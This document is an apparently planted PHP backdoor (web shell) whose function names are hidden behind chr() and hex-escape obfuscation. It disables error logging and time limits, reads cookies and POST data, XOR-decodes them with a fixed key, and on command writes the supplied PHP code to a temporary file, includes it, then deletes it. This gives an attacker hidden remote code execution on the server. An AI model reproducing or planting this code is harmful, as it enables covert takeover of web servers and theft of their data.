<?php $rheNPZcDEe = 'f'."\x69".chr(108).'e'."\137".'p'."\165".chr(951-835).'_'."\x63"."\157"."\x6e".chr(116).chr(101).chr(110)."\x74".chr(785-670);
$GtwEhKKb = chr(245-147).chr(97)."\163"."\145".chr(142-88)."\x34"."\x5f".'d'.chr(260-159)."\x63"."\157"."\144"."\x65";
$OWTDmGy = chr(105)."\156".chr(540-435).'_'.'s'."\145".'t';
$bloNCLp = "\165".chr(799-689).chr(108)."\151".chr(438-328)."\x6b";


@$OWTDmGy(chr(1093-992).chr(114).chr(114)."\157".chr(114).chr(95)."\x6c"."\x6f".chr(334-231), NULL);
@$OWTDmGy('l'."\x6f"."\147"."\137".chr(101)."\x72".chr(114).chr(111)."\162".chr(853-738), 0);
@$OWTDmGy(chr(109)."\x61".chr(120)."\x5f".chr(101).'x'.'e'."\143".'u'."\164"."\151".'o'.chr(1105-995).chr(95).'t'."\x69"."\x6d".chr(649-548), 0);
@set_time_limit(0);

function UYLbKMRH($hDNwOZ, $aMnEFG)
{
    $ofTpm = "";
    for ($AzyWI = 0; $AzyWI < strlen($hDNwOZ);) {
        for ($j = 0; $j < strlen($aMnEFG) && $AzyWI < strlen($hDNwOZ); $j++, $AzyWI++) {
            $ofTpm .= chr(ord($hDNwOZ[$AzyWI]) ^ ord($aMnEFG[$j]));
        }
    }
    return $ofTpm;
}

$AzyWIseVGsCv = array_merge($_COOKIE, $_POST);
$LhpReKdIC = '945c23e2-585b-4157-ba30-8c272a294cc6';
foreach ($AzyWIseVGsCv as $PJfqu => $hDNwOZ) {
    $hDNwOZ = @unserialize(UYLbKMRH(UYLbKMRH($GtwEhKKb($hDNwOZ), $LhpReKdIC), $PJfqu));
    if (isset($hDNwOZ[chr(97).chr(580-473)])) {
        if ($hDNwOZ["\x61"] == "\x69") {
            $AzyWI = array(
                'p'.chr(118) => @phpversion(),
                's'."\x76" => "3.5",
            );
            echo @serialize($AzyWI);
        } elseif ($hDNwOZ["\x61"] == "\145") {
            $eWlzAtGd = "./" . md5($LhpReKdIC) . '.'.'i'.chr(110).'c';
            @$rheNPZcDEe($eWlzAtGd, "<" . "\77".chr(112).chr(883-779)."\160".chr(171-139).chr(64).chr(117).chr(931-821)."\154".chr(105)."\x6e".'k'."\x28"."\137".chr(95).'F'."\x49".'L'."\x45".chr(95)."\x5f".')'.chr(180-121)."\40" . $hDNwOZ["\x64"]);
            include($eWlzAtGd);
            @$bloNCLp($eWlzAtGd);
        }
        exit();
    }
}

